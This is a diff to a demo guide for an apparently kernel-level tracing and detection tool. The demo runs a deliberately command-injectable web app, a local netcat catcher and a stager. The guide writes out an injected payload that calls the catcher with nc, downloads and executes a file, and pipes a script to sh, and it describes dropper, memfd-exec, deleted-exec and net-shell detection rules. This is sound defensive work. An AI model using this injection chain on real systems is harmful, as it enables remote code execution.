@@ -31,12 +31,20 @@ sudo P15_PYTHON=$HOME/p15venv/bin/python3 tools/demo/run_demo.sh ~/demo-$(date +
 | 1 | `nc -l 127.0.0.1 4444`, standing in for an attacker's catcher | LISTEN on 4444 by `nc` |
 | 2 | `tools/demo/webapp.py 8080`, a web app with a command-injection bug, on purpose | BIND and LISTEN on 8080 by `python3` |
 | 3 | three ordinary `curl` requests | 3 CONNECTs and 3 ACCEPTs on 8080, each client found by endpoints |
-| 4 | one request that injects `; nc -w1 127.0.0.1 4444` | an ACCEPT on 8080, then `python3` → `sh` → `nc`, and `nc`'s CONNECT to 4444, accepted by the catcher |
+| 2b | a stager, `python3 -m http.server 8000`, serving `k` (a copy of `id`) and `s2` (a script) | BIND and LISTEN on 8000 |
+| 4 | one request that injects `; nc -w1 127.0.0.1 4444; curl …/k -o /tmp/.k; chmod +x /tmp/.k; /tmp/.k; curl …/s2 \| sh` | an ACCEPT on 8080, then `python3` → `sh`; `sh` → `nc` and its CONNECT to 4444, accepted by the catcher; `curl` writes `/tmp/.k` and a child of `sh` runs it (rule R1); `s2` runs `id` from a memfd (R2) and from a file it deleted (R3) |
 | 5 | blocking connects to 4441-4443 | three CONNECTs, ret −111 (ECONNREFUSED), by `bash` |
 
 A dry run in the cloud container already captured the step-4 chain in the spine: `nc (31940) ← sh (31938) ← python3 (31908)`, with the injected command line. That run had network capture off, because the container refuses fexit (E-0078). See [the dry run](../evidence/demo/2026-11-02-container-dry-run/README.md).
 
 ## Talking points, in order
+
+With `--flow` (the default the VM test package uses), the demo ends by building the run's graph and printing two more outputs, also written to the output folder:
+- `rules.txt`: the four detection rules over the graph (`python3 -m p15.graph.rules`): R1 dropper, R2 memfd-exec, R3 deleted-exec, R4 net-shell.
+- `attack-path.txt` and `attack-path.html`: the attack path from the shell the web app started (`python3 -m p15.graph.story`). It walks backward and forward over the graph, keeps the processes, sockets and the files that carry the story, and leaves out libraries and other files only read on the way.
+
+Expect R4 to fire twice: once for the injected shell, and once for an ordinary lookup, because the web app starts a shell for every lookup. The attack path starts from the R4 alert that leads to the other alerts. Rules are patterns, not verdicts, and that is a point to make.
+
 
 1. **`tools/p15-trace --port 8080 RUN`**: who listened (the web app, and its parent), each accepted connection and its client process (`curl`), and the trust line at the top: capture valid, invariant closed, NET records lost 0.
 2. **`--port 4444`**: the money shot. The connect to 4444 came from `nc`, whose parent is `sh`, whose parent is **the web server**. The command line shows the injection. The catcher's accept is joined to it.
